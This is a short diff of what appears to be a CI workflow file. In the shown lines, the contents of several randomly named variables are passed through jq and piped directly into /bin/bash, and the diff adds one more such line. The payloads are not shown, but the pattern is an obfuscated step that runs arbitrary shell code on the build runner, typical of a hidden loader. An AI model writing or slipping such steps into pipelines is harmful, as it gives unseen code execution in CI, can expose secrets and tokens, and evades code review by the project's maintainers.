@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$ekhio941" | jq -r .khz7 | /bin/bash
           printf '%s' "$jkt93895" | jq -r .u58216 | /bin/bash
           echo $az0996 | jq -r .e8948 | /bin/bash
+          echo $rkw8 | jq -r .zx8428 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
